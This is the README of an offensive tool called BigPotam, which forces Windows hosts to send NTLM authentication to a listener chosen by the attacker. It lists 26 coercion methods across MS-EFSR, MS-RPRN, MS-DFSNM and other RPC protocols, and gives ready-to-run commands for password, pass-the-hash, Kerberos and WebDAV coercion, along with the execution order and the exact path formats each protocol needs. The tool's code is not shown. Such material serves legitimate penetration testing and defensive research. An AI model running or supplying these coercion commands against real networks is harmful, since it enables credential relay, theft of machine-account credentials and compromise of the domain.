# BigPotam

Unified NTLM authentication coercion tool. Consolidates all known coercion primitives across 8 protocols into a single tool with stop-on-first-success behavior.

## Protocols & Methods (26 total)

| Protocol | Methods | Pipe / Transport | WebDAV |
|----------|---------|-------------------|--------|
| MS-EFSR | 11 functions (opnums 0,4,5,6,7,8,9,12,13,15,16) | lsarpc, efsrpc, samr, lsass, netlogon | Yes |
| MS-RPRN | RpcRemoteFindFirstPrinterChangeNotification (62), Ex (65), Ex via EPM | spoolss / dcerpc | Yes |
| MS-PAR | RpcAsyncOpenPrinter (0) | spoolss | No |
| MS-DFSNM | 6 functions (opnums 12,13,14,15,23,24) | netdfs | Partial |
| MS-FSRVP | IsPathSupported (8), IsPathShadowCopied (9) | FssagentRpc | Yes |
| MS-EVEN | ElfrOpenBELW (9) | eventlog | No |
| MS-WSP | WSP Connect/Query/Disconnect | MsFteWds (SMB pipe) | No |
| DCOM | UpdateSession.AddScanPackageService | DCOM port 135 | No |

## Installation

```bash
pip install impacket
```

## Usage

```bash
# Basic — stop on first successful coercion
python3 bigpotam.py domain/user:password@target 10.0.0.5

# Try all methods (enumerate everything)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -all

# WebDAV coercion (port 80 triggers WebClient/WebDAV paths)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -listener-port 80

# Target a specific protocol
python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR

# Target a specific method
python3 bigpotam.py domain/user:password@target 10.0.0.5 -method EfsRpcEncryptFileSrv

# Try all EFSR named pipes (not just lsarpc)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR -all-pipes

# Pass-the-hash
python3 bigpotam.py domain/user@target 10.0.0.5 -hashes :aad3b435b51404eeaad3b435b51404ee

# Kerberos
python3 bigpotam.py domain/user@target 10.0.0.5 -k -dc-ip 10.0.0.1

# Timestamps + debug
python3 bigpotam.py domain/user:password@target 10.0.0.5 -ts -debug
```

## Arguments

```
positional:
  target              [[domain/]username[:password]@]<host>
  listener            IP or hostname for auth callback

coercion:
  -listener-port      Listener port (default: 445, use 80 for WebDAV)
  -method             Specific method name
  -protocol           Limit to one protocol
  -all                Try all methods even after success
  -all-pipes          Try all EFSR named pipes per method

authentication:
  -hashes             LMHASH:NTHASH
  -no-pass            Skip password prompt
  -k                  Kerberos authentication
  -dc-ip              Domain controller IP

connection:
  -target-ip          Target IP if different from hostname
  -port               SMB port (139 or 445, default 445)
  -timeout            Connection timeout seconds (default 5)

output:
  -ts                 Add timestamps to output
  -debug              Verbose debug output
```

## Execution Order

When `-all` is not set, methods are tried in this order (most reliable first):

1. **MS-EFSR** via lsarpc — 11 functions, universally accessible pipe
2. **MS-RPRN** via spoolss — PrinterBug (opnum 62 and 65)
3. **MS-RPRN** via EPM/TCP — dynamic endpoint when spoolss pipe is blocked
4. **MS-PAR** — RpcAsyncOpenPrinter
5. **MS-DFSNM** — 6 DFS namespace functions
6. **MS-FSRVP** — ShadowCoerce (IsPathSupported, IsPathShadowCopied)
7. **MS-EVEN** — ElfrOpenBELW with device path format
8. **MS-WSP** — Windows Search (workstations only, disabled on servers since 2016)
9. **DCOM** — UpdateSession (machine account, port 135/DCOM)

## Features

- **EFS auto-activation**: Queries EPM on port 135 before EFSR attempts to wake up the EFS service on-demand
- **Stop on first success**: Default behavior, use `-all` to enumerate everything
- **WebDAV support**: Use `-listener-port 80` to generate `\\host@80/path` UNC paths for WebClient coercion
- **Per-method error code checking**: Each protocol checks specific error codes (ERROR_BAD_NETPATH, rpc_s_access_denied, etc.) rather than catching all exceptions
- **Failed pipe tracking**: Skips pipes that already failed to connect, avoiding redundant attempts
- **Protocol-correct path formats**: Each protocol uses its exact required format (device paths for MS-EVEN, file:// URIs for MS-WSP, random shares for DCOM)

## Key Notes

- **MS-EVEN** uses `\\??\UNC\` device path format — not a standard UNC path
- **MS-WSP** uses `file:////listener/share` with forward slashes
- **DCOM UpdateSession** connects via port 135/DCOM, not named pipes — coerces the **machine account**
- **MS-RPRN** requires `RpcOpenPrinter` handle before calling notification functions
- **EFSR UUID varies by pipe**: `efsrpc` pipe uses `df1941c5-...`, all others use `c681d488-...`

## Credits

Built on research and code from:
- [PetitPotam](https://github.com/topotam/PetitPotam) by topotam
- [PetitPotam](https://github.com/ly4k/PetitPotam) by ly4k
- [Coercer](https://github.com/p0dalirius/Coercer) by p0dalirius
- [NetExec coerce_plus](https://github.com/Pennyw0rth/NetExec) by Pennyw0rth
- [windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) by p0dalirius
- [wspcoerce](https://github.com/RedTeamPentesting/wspcoerce) by RedTeam Pentesting
- [RemoteMonologue](https://github.com/xforcered/RemoteMonologue) by xforcered
- SpoolSample by Lee Christensen (@tifkin_)
- PrinterBug by Dirk-jan Mollema
- DFSCoerce, ShadowCoerce community research
